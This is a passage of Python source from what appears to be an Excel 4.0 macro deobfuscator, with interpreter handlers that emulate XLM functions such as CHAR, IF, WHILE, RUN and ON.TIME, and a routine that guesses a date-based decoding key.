            return_val = text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        return EvalResult(None, status, return_val, text)

    def get_window_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.Error
        if len(arguments) == 1:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

            if arg_eval_result.status == EvalStatus.FullEvaluation and self.is_float(arg_eval_result.get_text()):
                window_param = self.get_window(int(float(arg_eval_result.get_text())))
                # current_cell.value = window_param
                text = window_param  # XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                return_val = window_param

                # Overwrites to take actual values from the workbook instead of default config
                if int(float(arg_eval_result.get_text())) == 1 or int(float(arg_eval_result.get_text())) == 30:
                    return_val = "[" + self.xlm_wrapper.get_workbook_name() + "]" + current_cell.sheet.name
                    status = EvalStatus.FullEvaluation

                status = EvalStatus.FullEvaluation
            else:
                return_val = text = 'GET.WINDOW({})'.format(arg_eval_result.get_text())
                status = arg_eval_result.status
        if status == EvalStatus.Error:
            return_val = text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def get_document_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.Error
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        return_val = ""
        # Static implementation
        if self.is_int(arg_eval_result.value):
            status = EvalStatus.PartialEvaluation
            if int(arg_eval_result.value) == 76:
                return_val = "[" + self.xlm_wrapper.get_workbook_name() + "]" + current_cell.sheet.name
                status = EvalStatus.FullEvaluation
            elif int(arg_eval_result.value) == 88:
                return_val = self.xlm_wrapper.get_workbook_name()
                status = EvalStatus.FullEvaluation
        text = return_val
        return EvalResult(None, status, return_val, text)

    def on_time_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.Error
        if len(arguments) == 2:
            arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
            next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[1])
            sheets = self.xlm_wrapper.get_macrosheets()
            if next_sheet in sheets:
                next_cell = self.get_formula_cell(sheets[next_sheet], next_col, next_row)
                text = 'ON.TIME({},{})'.format(arg1_eval_result.get_text(), str(next_cell))
                status = EvalStatus.FullEvaluation
                return_val = 0

            return_val = text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        if status == EvalStatus.Error:
            next_cell = None

        return EvalResult(next_cell, status, return_val, text)

    def app_maximize_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.FullEvaluation
        return_val = True
        text = str(return_val)
        return EvalResult(None, status, return_val, text)

    def concatenate_handler(self, arguments, current_cell, interactive, parse_tree_root):
        text = ''
        for arg in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arg, interactive)
            text += arg_eval_result.get_text(unwrap=True)
        return_val = text
        text = EvalResult.wrap_str_literal(text)
        status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def day_handler(self, arguments, current_cell, interactive, parse_tree_root):
        if self.day_of_month is None:
            arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
            if arg1_eval_result.status == EvalStatus.FullEvaluation:
                if type(arg1_eval_result.value) is datetime.datetime:
                    #
                    # text = str(arg1_eval_result.value.day)
                    # return_val = text
                    # status = EvalStatus.FullEvaluation

                    return_val, status, text = self.guess_day()

                elif self.is_float(arg1_eval_result.value):
                    text = 'DAY(Serial Date)'
                    status = EvalStatus.NotImplemented
            else:
                text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                status = arg1_eval_result.status
        else:
            text = str(self.day_of_month)
            return_val = text
            status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def guess_day(self):

        xlm = self
        min = 1
        best_day = 0
        for day in range(1, 32):
            xlm.char_error_count = 0
            non_printable_ascii = 0
            total_count = 0
            xlm = copy.copy(xlm)
            xlm.day_of_month = day
            try:
                for index, step in enumerate(xlm.deobfuscate_macro(False, silent_mode=True)):
                    for char in step[2]:
                        if not (32 <= ord(char) <= 128):
                            non_printable_ascii += 1
                    total_count += len(step[2])

                    if index > 10 and ((non_printable_ascii + xlm.char_error_count) / total_count) > min:
                        break

                if total_count != 0 and ((non_printable_ascii + xlm.char_error_count) / total_count) < min:
                    min = ((non_printable_ascii + xlm.char_error_count) / total_count)
                    best_day = day
                    if min == 0:
                        break
            except Exception as exp:
                pass
        self.day_of_month = best_day
        text = str(self.day_of_month)
        return_val = text
        status = EvalStatus.FullEvaluation
        return return_val, status, text
    #https://stackoverflow.com/questions/9574793/how-to-convert-a-python-datetime-datetime-to-excel-serial-date-number
    def excel_date(self, date1):
            temp = datetime.datetime(1899, 12, 30)    # Note, not 31st Dec but 30th!
            delta = date1 - temp
            return float(delta.days) + (float(delta.seconds) / 86400)

    def now_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return_val = text = self.excel_date(datetime.datetime.now() + datetime.timedelta(seconds=self._now_count * self._now_step))
        self._now_count += 1
        status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def value_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return_val_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = EvalStatus.FullEvaluation
        value = EvalResult.unwrap_str_literal(return_val_result.value)
        if EvalResult.is_int(value):
            return_val = int(value)
            text = str(return_val)
        elif EvalResult.is_float(value):
            return_val = float(value)
            text = str(return_val)
        else:
            status = EvalStatus.Error
            text = self.convert_ptree_to_str(parse_tree_root)
            return_val = 0
        return EvalResult(None, status, return_val, text)

    def if_handler(self, arguments, current_cell, interactive, parse_tree_root):
        visited = False
        for stack_frame in self._branch_stack:
            if stack_frame[0].get_local_address() == current_cell.get_local_address():
                visited = True
        if visited is False:
            # self._indent_level += 1
            size = len(arguments)
            if size == 3:
                cond_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
                if self.is_bool(cond_eval_result.value):
                    cond_eval_result.value = bool(strtobool(cond_eval_result.value))
                elif self.is_int(cond_eval_result.value):
                    if int(cond_eval_result.value) == 0:
                        cond_eval_result.value = False
                    else:
                        cond_eval_result.value = True

                if cond_eval_result.status == EvalStatus.FullEvaluation:
                    if cond_eval_result.value:
                        if type(arguments[1]) is Tree or type(arguments[1]) is Token:
                            self._branch_stack.append(
                                (current_cell, arguments[1], current_cell.sheet.cells, self._indent_level, '[TRUE]'))
                            status = EvalStatus.Branching
                        else:
                            status = EvalStatus.FullEvaluation
                    else:
                        if type(arguments[2]) is Tree or type(arguments[2]) is Token:
                            self._branch_stack.append(
                                (current_cell, arguments[2], current_cell.sheet.cells, self._indent_level, '[FALSE]'))
                            status = EvalStatus.Branching
                        else:
                            status = EvalStatus.FullEvaluation
                    text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)

                else:
                    memory_state = copy.deepcopy(current_cell.sheet.cells)
                    if type(arguments[2]) is Tree or type(arguments[2]) is Token or type(arguments[2]) is list:
                        self._branch_stack.append(
                            (current_cell, arguments[2], memory_state, self._indent_level, '[FALSE]'))

                    if type(arguments[1]) is Tree or type(arguments[1]) is Token or type(arguments[1]) is list:
                        self._branch_stack.append(
                            (current_cell, arguments[1], current_cell.sheet.cells, self._indent_level, '[TRUE]'))

                    text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)

                    status = EvalStatus.FullBranching
            else:
                status = EvalStatus.FullEvaluation
                text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        else:
            # loop detected
            text = '[[LOOP]]: ' + XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            status = EvalStatus.End
        return EvalResult(None, status, 0, text)

    def mid_handler(self, arguments, current_cell, interactive, parse_tree_root):
        str_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        base_eval_result = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        len_eval_result = self.evaluate_parse_tree(current_cell, arguments[2], interactive)
        status = EvalStatus.PartialEvaluation
        return_val = ""
        if str_eval_result.status == EvalStatus.FullEvaluation:
            if base_eval_result.status == EvalStatus.FullEvaluation and \
                    len_eval_result.status == EvalStatus.FullEvaluation:
                if self.is_float(base_eval_result.value) and self.is_float(len_eval_result.value):
                    base = int(float(base_eval_result.value)) - 1
                    length = int(float(len_eval_result.value))
                    return_val = EvalResult.unwrap_str_literal(str_eval_result.value)[base: base + length]
                    text = str(return_val)
                    status = EvalStatus.FullEvaluation
        if status == EvalStatus.PartialEvaluation:
            text = 'MID({},{},{})'.format(XLMInterpreter.convert_ptree_to_str(arguments[0]),
                                          XLMInterpreter.convert_ptree_to_str(arguments[1]),
                                          XLMInterpreter.convert_ptree_to_str(arguments[2]))
        return EvalResult(None, status, return_val, text)

    def min_handler(self, arguments, current_cell, interactive, parse_tree_root):
        min = None
        status = EvalStatus.PartialEvaluation

        for argument in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, argument, interactive)
            if arg_eval_result.status == EvalStatus.FullEvaluation:
                cur_val = self.convert_float(arg_eval_result.value)
                if not min or cur_val < min:
                    min = cur_val
            else:
                min = None
                break

        if min:
            return_val = min
            text = str(min)
            status = EvalStatus.FullEvaluation
        else:
            text = return_val = self.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def max_handler(self, arguments, current_cell, interactive, parse_tree_root):
        max = None
        status = EvalStatus.PartialEvaluation

        for argument in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, argument, interactive)
            if arg_eval_result.status == EvalStatus.FullEvaluation:
                cur_val = self.convert_float(arg_eval_result.value)
                if not max or cur_val > max:
                    max = cur_val
            else:
                max = None
                break

        if max:
            return_val = max
            text = str(max)
            status = EvalStatus.FullEvaluation
        else:
            text = return_val = self.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def product_handler(self, arguments, current_cell, interactive, parse_tree_root):
        total = None
        status = EvalStatus.PartialEvaluation

        for argument in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, argument, interactive)
            if arg_eval_result.status == EvalStatus.FullEvaluation:
                if not total:
                    total = self.convert_float(arg_eval_result.value)
                else:
                    total *= self.convert_float(arg_eval_result.value)
            else:
                total = None
                break

        if total:
            return_val = total
            text = str(total)
            status = EvalStatus.FullEvaluation
        else:
            text = return_val = self.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def mod_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg2_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        if arg1_eval_res.status == EvalStatus.FullEvaluation and arg2_eval_res.status == EvalStatus.FullEvaluation:
            return_val = float(arg1_eval_res.value) % float(arg2_eval_res.value)
            text = str(return_val)
            status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def sqrt_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = EvalStatus.PartialEvaluation

        if arg1_eval_res.status == EvalStatus.FullEvaluation:
            return_val = math.floor(math.sqrt(float(arg1_eval_res.value)))
            text = str(return_val)
            status = EvalStatus.FullEvaluation

        if status == EvalStatus.PartialEvaluation:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)
        return EvalResult(None, status, return_val, text)

    def goto_handler(self, arguments, current_cell, interactive, parse_tree_root):
        next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[0])
        next_cell = None
        if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
            next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
                                              next_col,
                                              next_row)
            status = EvalStatus.FullEvaluation
        else:
            status = EvalStatus.Error
        text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        return_val = 0
        return EvalResult(next_cell, status, return_val, text)

    def halt_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return_val = text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        status = EvalStatus.End
        self._indent_level -= 1
        return EvalResult(None, status, return_val, text)

    def call_handler(self, arguments, current_cell, interactive, parse_tree_root):
        argument_texts = []
        status = EvalStatus.FullEvaluation
        for argument in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, argument, interactive)
            if arg_eval_result.status != EvalStatus.FullEvaluation:
                status = arg_eval_result.status
            argument_texts.append(arg_eval_result.get_text())

        list_separator = self.xlm_wrapper.get_xl_international_char(XlApplicationInternational.xlListSeparator)
        text = 'CALL({})'.format(list_separator.join(argument_texts))
        return_val = 0
        return EvalResult(None, status, return_val, text)

    def is_number_handler(self, arguments, current_cell, interactive, parse_tree_root):
        eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if eval_result.status == EvalStatus.FullEvaluation:
            if self.is_int(eval_result.text) or self.is_float(eval_result.text):
                return_val = 1
            else:
                return_val = 0
            text = str(return_val)
        else:
            text = 'ISNUMBER({})'.format(eval_result.get_text())
            return_val = 1  # true

        return EvalResult(None, eval_result.status, return_val, text)

    def search_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg2_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        if arg1_eval_res.status == EvalStatus.FullEvaluation and arg2_eval_res.status == EvalStatus.FullEvaluation:
            try:
                arg1_val = EvalResult.unwrap_str_literal(str(arg1_eval_res.value))
                arg2_val = EvalResult.unwrap_str_literal(arg2_eval_res.value)
                return_val = arg2_val.lower().index(arg1_val.lower())
                text = str(return_val)
            except ValueError:
                return_val = None
                text = ''
            status = EvalStatus.FullEvaluation
        else:
            text = 'SEARCH({},{})'.format(arg1_eval_res.get_text(), arg2_eval_res.get_text())
            return_val = 0
            status = EvalStatus.PartialEvaluation

        return EvalResult(None, status, return_val, text)

    def round_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg2_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        if arg1_eval_res.status == EvalStatus.FullEvaluation and arg2_eval_res.status == EvalStatus.FullEvaluation:
            return_val = round(float(arg1_eval_res.value), int(float(arg2_eval_res.value)))
            text = str(return_val)
            status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def roundup_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if arg1_eval_res.status == EvalStatus.FullEvaluation:
            return_val = math.ceil(float(arg1_eval_res.value))
            text = str(return_val)
            status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def directory_handler(self, arguments, current_cell, interactive, parse_tree_root):
        text = r'C:\Users\user\Documents'
        return_val = text
        status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def char_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

        if arg_eval_result.status == EvalStatus.FullEvaluation:
            value = arg_eval_result.text
            if arg_eval_result.value in self.defined_names:
                value = self.defined_names[arg_eval_result.value].value
            if 0 <= float(value) <= 255:
                return_val = text = chr(int(float(value)))
                # cell = self.get_formula_cell(current_cell.sheet, current_cell.column, current_cell.row)
                # cell.value = text
                status = EvalStatus.FullEvaluation
            else:
                return_val = text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                self.char_error_count += 1
                status = EvalStatus.Error
        else:
            text = 'CHAR({})'.format(arg_eval_result.text)
            return_val = text
            status = EvalStatus.PartialEvaluation
        return EvalResult(arg_eval_result.next_cell, status, return_val, text)

    def t_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        return_val = ''
        if arg_eval_result.status == EvalStatus.FullEvaluation:
            if isinstance(arg_eval_result.value, tuple) and len(arg_eval_result.value) == 3:
                cell = self.get_cell(arg_eval_result.value[0], arg_eval_result.value[1], arg_eval_result.value[2])
                return_val = cell.value
            elif arg_eval_result.value != 'TRUE' and arg_eval_result.value != 'FALSE':
                return_val = str(arg_eval_result.value)
            status = EvalStatus.FullEvaluation
        else:
            status = EvalStatus.PartialEvaluation
        return EvalResult(arg_eval_result.next_cell, status, return_val, EvalResult.wrap_str_literal(str(return_val), must_wrap=True))

    def int_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        return_val = int(0)
        if arg_eval_result.status == EvalStatus.FullEvaluation:
            text = str(arg_eval_result.value).lower()
            if text == "true":
                return_val = int(1)
            elif text == "false":
                return_val = int(0)
            else:
                return_val = int(arg_eval_result.value)
            status = EvalStatus.FullEvaluation
        else:
            status = EvalStatus.PartialEvaluation
        return EvalResult(arg_eval_result.next_cell, status, return_val, str(return_val))

    def run_handler(self, arguments, current_cell, interactive, parse_tree_root):
        size = len(arguments)
        next_cell = None
        status = EvalStatus.PartialEvaluation
        if 1 <= size <= 2:
            next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[0])
            if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
                next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
                                                  next_col,
                                                  next_row)
                if size == 1:
                    text = 'RUN({}!{}{})'.format(next_sheet, next_col, next_row)
                else:
                    text = 'RUN({}!{}{}, {})'.format(next_sheet, next_col, next_row,
                                                     XLMInterpreter.convert_ptree_to_str(arguments[1]))
                status = EvalStatus.FullEvaluation
            else:
                text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                status = EvalStatus.Error
            return_val = 0
        else:
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            status = EvalStatus.Error
            return_val = 1

        return EvalResult(next_cell, status, return_val, text)

    def formula_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return self.evaluate_formula(current_cell, 'FORMULA', arguments, interactive)

    def formula_fill_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return self.evaluate_formula(current_cell, 'FORMULA.FILL', arguments, interactive)

    def formula_array_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return self.evaluate_formula(current_cell, 'FORMULA.ARRAY', arguments, interactive)

    def set_value_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return self.evaluate_formula(
            current_cell, 'SET.VALUE', arguments, interactive, destination_arg=2, set_value_only=True)

    def error_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return EvalResult(None, EvalStatus.FullEvaluation, 0, XLMInterpreter.convert_ptree_to_str(parse_tree_root))

    def select_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation

        range_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

        if len(arguments) == 2:
            # e.g., SELECT(B1:B100,B1) and SELECT(,"R[1]C")
            if self.active_cell:
                sheet, col, row = self.get_cell_addr(self.active_cell, arguments[1])
            else:
                sheet, col, row = self.get_cell_addr(current_cell, arguments[1])

            if sheet:
                self.active_cell = self.get_cell(sheet, col, row)
                status = EvalStatus.FullEvaluation
        elif isinstance(arguments[0], Token):
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            return_val = 0
        elif arguments[0].data == 'range':
            # e.g., SELECT(D1:D10:D1)
            sheet, col, row = self.selected_range[2]
            if sheet:
                self.active_cell = self.get_cell(sheet, col, row)
                status = EvalStatus.FullEvaluation
        elif arguments[0].data == 'cell':
            # select(R1C1)
            if self.active_cell:
                sheet, col, row = self.get_cell_addr(self.active_cell, arguments[0])
            else:
                sheet, col, row = self.get_cell_addr(current_cell, arguments[0])
            if sheet:
                self.active_cell = self.get_cell(sheet, col, row)
                status = EvalStatus.FullEvaluation

        text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        return_val = 0

        return EvalResult(None, status, return_val, text)

    def iterate_range(self, name, start_cell, end_cell):
        sheet_name = start_cell[0]
        row_start = int(start_cell[2])
        row_end = int(end_cell[2])
        for row_index in range(row_start, row_end + 1):
            col_start = Cell.convert_to_column_index(start_cell[1])
            col_end = Cell.convert_to_column_index(end_cell[1])
            for col_index in range(col_start, col_end+1):
                next_cell = self.get_cell(sheet_name, Cell.convert_to_column_name(col_index), row_index)
                if next_cell:
                    yield next_cell

    def forcell_handler(self, arguments, current_cell, interactive, parse_tree_root):
        var_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

        start_cell_ptree, end_cell_ptree = self.get_range_parts(arguments[1])
        start_cell = self.get_cell_addr(current_cell, start_cell_ptree)
        end_cell = self.get_cell_addr(current_cell, end_cell_ptree)

        if start_cell[0] != end_cell[0]:
            end_cell = (start_cell[0], end_cell[1], end_cell[2])

        skip = False
        if len(arguments) >= 3:
            skip_eval_result = self.evaluate_parse_tree(current_cell, arguments[2], interactive)
            skip = bool(skip_eval_result.value)

        variable_name = EvalResult.unwrap_str_literal(var_eval_result.value).lower()

        if len(self._while_stack) > 0 and self._while_stack[-1]['start_point'] == current_cell:
            iterator = self._while_stack[-1]['iterator']
        else:
            iterator = self.iterate_range(variable_name, start_cell, end_cell)
            stack_record = {'start_point': current_cell, 'status': True, 'iterator': iterator}
            self._while_stack.append(stack_record)

        try:
            self.defined_names[variable_name] = next(iterator)
        except:
            self._while_stack[-1]['status'] = False

        self._indent_level += 1

        return EvalResult(None, EvalStatus.FullEvaluation, 0 , self.convert_ptree_to_str(parse_tree_root))

    def while_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        text = ''

        stack_record = {'start_point': current_cell, 'status': False}

        condition_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = condition_eval_result.status
        if condition_eval_result.status == EvalStatus.FullEvaluation:
            if str(condition_eval_result.value).lower() == 'true':
                stack_record['status'] = True
            text = '{} -> [{}]'.format(XLMInterpreter.convert_ptree_to_str(parse_tree_root),
                                       str(condition_eval_result.value))

        if not text:
            text = '{}'.format(XLMInterpreter.convert_ptree_to_str(parse_tree_root))

        self._while_stack.append(stack_record)

        if stack_record['status'] == False:
            self.ignore_processing = True

        self._indent_level += 1

        return EvalResult(None, status, 0, text)

    def next_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.FullEvaluation
        next_cell = None
        if self._indent_level == len(self._while_stack):
            self.ignore_processing = False
            next_cell = None
            if len(self._while_stack) > 0:
                top_record = self._while_stack.pop()
                if top_record['status'] is True:
                    next_cell = top_record['start_point']
                if 'iterator' in top_record:
                    self._while_stack.append(top_record)
            self._indent_level = self._indent_level - 1 if self._indent_level > 0 else 0
            self._indent_current_line = True

        if next_cell is None:
            status = EvalStatus.IGNORED

        return EvalResult(next_cell, status, 0, 'NEXT')

    def len_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if arg_eval_result.status == EvalStatus.FullEvaluation:
            return_val = len(arg_eval_result.get_text(unwrap=True))
            text = str(return_val)
            status = EvalStatus.FullEvaluation
        else:
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            return_val = text
            status = EvalStatus.PartialEvaluation
        return EvalResult(None, status, return_val, text)

    def define_name_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_name_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = EvalStatus.PartialEvaluation
        if arg_name_eval_result.status == EvalStatus.FullEvaluation:
            arg_val_eval_result = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
            status = EvalStatus.FullEvaluation
            name = EvalResult.unwrap_str_literal(arg_name_eval_result.text).lower()
            if EvalResult.is_int(arg_val_eval_result.value):
                self.defined_names[name] = int(arg_val_eval_result.value)
            elif EvalResult.is_float(arg_val_eval_result.value):
                self.defined_names[name] = float(arg_val_eval_result.value)
            else:
                self.defined_names[name] = arg_val_eval_result.value
            return_val = self.defined_names[name]
            text = "DEFINE.NAME({},{})".format(EvalResult.wrap_str_literal(name), str(return_val))
        else:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)
        return EvalResult(None, status, return_val, text)

    def index_handler(self, arguments, current_cell, interactive, parse_tree_root):
        array_arg_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = EvalStatus.PartialEvaluation
        if array_arg_result.status == EvalStatus.FullEvaluation:
            index_arg_result = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
            if isinstance(array_arg_result.value, list):
                # example: f9adf499bc16bfd096e00bc59c3233f022dec20c20440100d56e58610e4aded3
                return_val = array_arg_result.value[int(float(index_arg_result.value))-1]  # index starts at 1 in excel
            else:
                # example: 6a8045bc617df5f2b8f9325ed291ef05ac027144f1fda84e78d5084d26847902
                range = EvalResult.unwrap_str_literal(array_arg_result.value)
                parsed_range = Cell.parse_range_addr(range)
                index = int(float(index_arg_result.value))-1
                row_str = str(int(float(parsed_range[2])) + index)

                if parsed_range[0]:
                    sheet_name = parsed_range[0]
                else:
                    sheet_name = current_cell.sheet.name

                return_val = self.get_cell(sheet_name, parsed_range[1], row_str)

            text = str(return_val)
            status = EvalStatus.FullEvaluation
        else:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)
        return EvalResult(None, status, return_val, text)

    def rows_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = EvalStatus.PartialEvaluation

        if arg_eval_result.status == EvalStatus.FullEvaluation:
            if isinstance(arg_eval_result.value, list):
                # example: f9adf499bc16bfd096e00bc59c3233f022dec20c20440100d56e58610e4aded3
                return_val = len(arg_eval_result.value)
            else:
                # example: 6a8045bc617df5f2b8f9325ed291ef05ac027144f1fda84e78d5084d26847902
                range = EvalResult.unwrap_str_literal(arg_eval_result.value)
                parsed_range = Cell.parse_range_addr(range)
                return_val = int(parsed_range[4]) - int(parsed_range[2]) + 1
            text = str(return_val)
            status = EvalStatus.FullEvaluation

        else:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def counta_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        sheet_name, startcolumn, startrow, endcolumn, endrow = Cell.parse_range_addr(arg_eval_result.text)
        count = 0
        it = int(startrow)

        start_col_index = Cell.convert_to_column_index(startcolumn)
        end_col_index = Cell.convert_to_column_index(endcolumn)

        start_row_index = int(startrow)
        end_row_index = int(endrow)

        val_item_count = 0
        for row in range(start_row_index, end_row_index + 1):
            for col in range(start_col_index, end_col_index + 1):
                if (sheet_name != None):
                    cell = self.get_worksheet_cell(sheet_name,
                                                   Cell.convert_to_column_name(col),
                                                   str(row))
                else:
                    cell = self.get_cell(current_cell.sheet.name,
                                         Cell.convert_to_column_name(col),
                                         str(row))

                if cell and cell.value != '':
                    val_item_count += 1

        return_val = val_item_count
        status = EvalStatus.FullEvaluation
        text = str(return_val)
        return EvalResult(None, status, return_val, text)

    def count_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return_val = len(arguments)
        text = str(return_val)
        status = EvalStatus.FullEvaluation
        return EvalResult(None, status, return_val, text)

    def trunc_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if arg_eval_result.status == EvalStatus.FullEvaluation:
            if arg_eval_result.value == "TRUE":
                return_val = 1
            elif arg_eval_result.value == "FALSE":
                return_val = 0
            else:
                return_val = math.trunc(float(arg_eval_result.value))
            text = str(return_val)
            status = EvalStatus.FullEvaluation
        else:
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            return_val = text
            status = EvalStatus.PartialEvaluation
        return EvalResult(None, status, return_val, text)

    def quotient_handler(self, arguments, current_cell, interactive, parse_tree_root):
        numerator_arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        Denominator_arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

        status = EvalStatus.PartialEvaluation
        if numerator_arg_eval_result.status == EvalStatus.FullEvaluation and \
                Denominator_arg_eval_result.status == EvalStatus.FullEvaluation:
            return_val = numerator_arg_eval_result.value // Denominator_arg_eval_result.value
            text = str(return_val)
            status = EvalStatus.FullEvaluation

        return EvalResult(None, status, return_val, text)

    def abs_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if arg_eval_result.status == EvalStatus.FullEvaluation:
            if arg_eval_result.value == "TRUE":
                return_val = 1
            elif arg_eval_result.value == "FALSE":
                return_val = 0
            else:
                return_val = abs(float(arg_eval_result.value))
            text = str(return_val)
            status = EvalStatus.FullEvaluation
        else:
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            return_val = text
            status = EvalStatus.PartialEvaluation
        return EvalResult(None, status, return_val, text)

    def absref_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_ref_txt_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = EvalStatus.PartialEvaluation
        if arg_ref_txt_eval_result.status == EvalStatus.FullEvaluation and \
                (isinstance(arguments[1], Tree) and arguments[1].data == 'cell'):
            offset_addr_text = arg_ref_txt_eval_result.value
            base_addr_text = self.convert_ptree_to_str(arguments[1])
            return_val = Cell.get_abs_addr(base_addr_text, offset_addr_text)
            status = EvalStatus.FullEvaluation
        else:
            return_val = XLMInterpreter.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, str(return_val))

    def address_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_row_num_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
